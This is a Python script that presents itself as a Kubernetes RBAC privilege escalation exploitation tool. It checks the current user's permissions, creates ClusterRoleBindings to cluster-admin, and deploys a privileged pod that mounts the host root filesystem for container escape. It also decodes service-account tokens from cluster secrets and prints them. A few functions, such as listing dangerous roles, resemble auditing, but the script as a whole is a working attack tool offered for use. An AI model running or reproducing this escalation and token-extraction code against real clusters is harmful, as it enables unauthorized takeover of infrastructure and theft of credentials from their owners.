#!/usr/bin/env python3
"""
Kubernetes RBAC Privilege Escalation Exploitation Tool
Identifies and exploits Kubernetes RBAC misconfigurations.
"""

import subprocess
import json
import argparse
import sys
from typing import List, Dict, Optional, Set
import yaml


class K8sPrivilegeEscalator:
    """Handles Kubernetes privilege escalation attacks."""
    
    def __init__(self, context: Optional[str] = None):
        self.context = context
        self.current_permissions = set()
        self.available_escalation_paths = []
    
    def run_kubectl(self, args: List[str], namespace: str = None) -> Optional[Dict]:
        """Execute kubectl command and return JSON output."""
        try:
            cmd = ['kubectl']
            if self.context:
                cmd.extend(['--context', self.context])
            if namespace:
                cmd.extend(['-n', namespace])
            cmd.extend(args)
            
            result = subprocess.run(cmd, capture_output=True, text=True)
            if result.returncode == 0 and result.stdout:
                try:
                    return json.loads(result.stdout)
                except:
                    return {'output': result.stdout}
        except Exception as e:
            print(f'Error running kubectl: {e}', file=sys.stderr)
        return None
    
    def get_current_permissions(self) -> Set[str]:
        """Get current user's permissions."""
        permissions = set()
        try:
            resources = ['pods', 'secrets', 'configmaps', 'deployments', 
                        'services', 'roles', 'rolebindings', 'clusterroles', 
                        'clusterrolebindings']
            
            for resource in resources:
                cmd = ['auth', 'can-i', 'get', resource]
                result = subprocess.run(
                    ['kubectl'] + cmd,
                    capture_output=True, text=True
                )
                if result.returncode == 0:
                    permissions.add(f'can-get-{resource}')
            
            # Check for dangerous permissions
            dangerous = ['create', 'delete', 'update', 'patch']
            for verb in dangerous:
                for resource in ['roles', 'clusterroles', 'rolebindings', 'clusterrolebindings']:
                    cmd = ['auth', 'can-i', verb, resource]
                    result = subprocess.run(
                        ['kubectl'] + cmd,
                        capture_output=True, text=True
                    )
                    if result.returncode == 0:
                        permissions.add(f'can-{verb}-{resource}')
        
        except Exception as e:
            print(f'Error checking permissions: {e}', file=sys.stderr)
        
        self.current_permissions = permissions
        return permissions
    
    def find_escalation_paths(self) -> List[str]:
        """Identify privilege escalation opportunities."""
        paths = []
        
        # Check if can create/update rolebindings
        if 'can-create-rolebindings' in self.current_permissions:
            paths.append('Create RoleBinding to cluster-admin')
        
        if 'can-create-clusterrolebindings' in self.current_permissions:
            paths.append('Create ClusterRoleBinding to cluster-admin')
        
        # Check if can modify RBAC resources
        if 'can-patch-clusterroles' in self.current_permissions:
            paths.append('Patch existing ClusterRole to add permissions')
        
        # Check if can create/exec pods
        if 'can-create-pods' in self.current_permissions and 'can-get-pods' in self.current_permissions:
            paths.append('Create privileged pod for escape')
        
        # Check if can read secrets
        if 'can-get-secrets' in self.current_permissions:
            paths.append('Extract service account tokens from secrets')
        
        return paths
    
    def create_admin_rolebinding(self, namespace: str = 'default',
                                sa_name: str = 'escalated') -> bool:
        """Create RoleBinding binding user to admin role."""
        try:
            binding_name = f'{sa_name}-admin'
            cmd = [
                'create', 'rolebinding', binding_name,
                '--clusterrole=cluster-admin',
                '--serviceaccount=' f'{namespace}:{sa_name}',
                '-n', namespace
            ]
            result = subprocess.run(
                ['kubectl'] + cmd,
                capture_output=True, text=True
            )
            return result.returncode == 0
        except Exception as e:
            print(f'Error creating rolebinding: {e}', file=sys.stderr)
        return False
    
    def create_cluster_admin_binding(self, sa_name: str = 'escalated',
                                    namespace: str = 'default') -> bool:
        """Create ClusterRoleBinding for cluster-admin access."""
        try:
            binding_name = f'{sa_name}-cluster-admin'
            cmd = [
                'create', 'clusterrolebinding', binding_name,
                '--clusterrole=cluster-admin',
                '--serviceaccount=' f'{namespace}:{sa_name}'
            ]
            result = subprocess.run(
                ['kubectl'] + cmd,
                capture_output=True, text=True
            )
            return result.returncode == 0
        except Exception as e:
            print(f'Error creating clusterrolebinding: {e}', file=sys.stderr)
        return False
    
    def create_privileged_pod(self, pod_name: str = 'escaper',
                             namespace: str = 'default') -> bool:
        """Create privileged pod for container escape."""
        try:
            pod_spec = {
                'apiVersion': 'v1',
                'kind': 'Pod',
                'metadata': {
                    'name': pod_name,
                    'namespace': namespace
                },
                'spec': {
                    'hostNetwork': True,
                    'hostPID': True,
                    'hostIPC': True,
                    'containers': [{
                        'name': 'escape',
                        'image': 'ubuntu:22.04',
                        'securityContext': {
                            'privileged': True,
                            'capabilities': {
                                'add': ['SYS_ADMIN', 'NET_ADMIN', 'CAP_SYS_MODULE']
                            }
                        },
                        'volumeMounts': [{
                            'name': 'root',
                            'mountPath': '/host_root'
                        }]
                    }],
                    'volumes': [{
                        'name': 'root',
                        'hostPath': {
                            'path': '/'
                        }
                    }]
                }
            }
            
            # Apply pod
            cmd = ['apply', '-f', '-']
            result = subprocess.run(
                ['kubectl'] + cmd,
                input=yaml.dump(pod_spec),
                capture_output=True, text=True
            )
            return result.returncode == 0
        except Exception as e:
            print(f'Error creating privileged pod: {e}', file=sys.stderr)
        return False
    
    def extract_service_account_tokens(self, namespace: str = 'default') -> Dict[str, str]:
        """Extract service account tokens from secrets."""
        tokens = {}
        try:
            cmd = ['get', 'secrets', '-n', namespace, '-o', 'json']
            result = self.run_kubectl(cmd)
            
            if result and 'items' in result:
                for secret in result['items']:
                    if secret.get('type') == 'kubernetes.io/service-account-token':
                        sa_name = secret['metadata'].get('annotations', {}).get(
                            'kubernetes.io/service-account.name'
                        )
                        if sa_name and 'token' in secret.get('data', {}):
                            import base64
                            token_b64 = secret['data']['token']
                            token = base64.b64decode(token_b64).decode('utf-8')
                            tokens[sa_name] = token
        except Exception as e:
            print(f'Error extracting tokens: {e}', file=sys.stderr)
        
        return tokens
    
    def get_dangerous_roles(self) -> List[Dict]:
        """Find roles with dangerous permissions."""
        dangerous_roles = []
        try:
            cmd = ['get', 'clusterroles', '-o', 'json']
            result = self.run_kubectl(cmd)
            
            if result and 'items' in result:
                for role in result['items']:
                    rules = role.get('rules', [])
                    for rule in rules:
                        verbs = rule.get('verbs', [])
                        api_groups = rule.get('apiGroups', [])
                        resources = rule.get('resources', [])
                        
                        # Check for dangerous permissions
                        if '*' in verbs and '*' in api_groups:
                            dangerous_roles.append({
                                'name': role['metadata']['name'],
                                'danger_level': 'CRITICAL',
                                'reason': 'Wildcard verbs and API groups'
                            })
                        elif 'create' in verbs and 'clusterrolebindings' in resources:
                            dangerous_roles.append({
                                'name': role['metadata']['name'],
                                'danger_level': 'HIGH',
                                'reason': 'Can create ClusterRoleBindings'
                            })
        except Exception as e:
            print(f'Error finding dangerous roles: {e}', file=sys.stderr)
        
        return dangerous_roles
    
    def audit_rbac(self) -> Dict:
        """Perform complete RBAC audit."""
        audit = {
            'permissions': list(self.get_current_permissions()),
            'escalation_paths': self.find_escalation_paths(),
            'dangerous_roles': self.get_dangerous_roles(),
            'exploitable': len(self.find_escalation_paths()) > 0
        }
        return audit


def main():
    parser = argparse.ArgumentParser(
        description='Kubernetes privilege escalation exploitation tool'
    )
    parser.add_argument('--action', 
                       choices=['check-perms', 'find-paths', 'audit', 'escalate',
                               'extract-tokens', 'dangerous-roles'],
                       required=True, help='Action to perform')
    parser.add_argument('--context', help='Kubernetes context')
    parser.add_argument('--namespace', default='default', help='Target namespace')
    parser.add_argument('--service-account', default='escalated', help='Service account name')
    
    args = parser.parse_args()
    
    escalator = K8sPrivilegeEscalator(args.context)
    
    if args.action == 'check-perms':
        perms = escalator.get_current_permissions()
        print(f'Current permissions ({len(perms)}):')
        for perm in sorted(perms):
            print(f'  - {perm}')
    
    elif args.action == 'find-paths':
        escalator.get_current_permissions()
        paths = escalator.find_escalation_paths()
        print(f'Escalation paths ({len(paths)}):')
        for path in paths:
            print(f'  - {path}')
    
    elif args.action == 'audit':
        audit = escalator.audit_rbac()
        print(json.dumps(audit, indent=2))
    
    elif args.action == 'escalate':
        success = escalator.create_cluster_admin_binding(
            args.service_account, args.namespace
        )
        if success:
            print(f'Successfully created admin binding: {args.service_account}')
            token = escalator.extract_service_account_tokens(args.namespace)
            if args.service_account in token:
                print(f'Token: {token[args.service_account]}')
        else:
            print('Failed to create admin binding')
    
    elif args.action == 'extract-tokens':
        tokens = escalator.extract_service_account_tokens(args.namespace)
        for sa, token in tokens.items():
            print(f'{sa}: {token[:50]}...')
    
    elif args.action == 'dangerous-roles':
        dangerous = escalator.get_dangerous_roles()
        for role in dangerous:
            print(f'{role["name"]}: {role["danger_level"]} - {role["reason"]}')


if __name__ == '__main__':
    main()
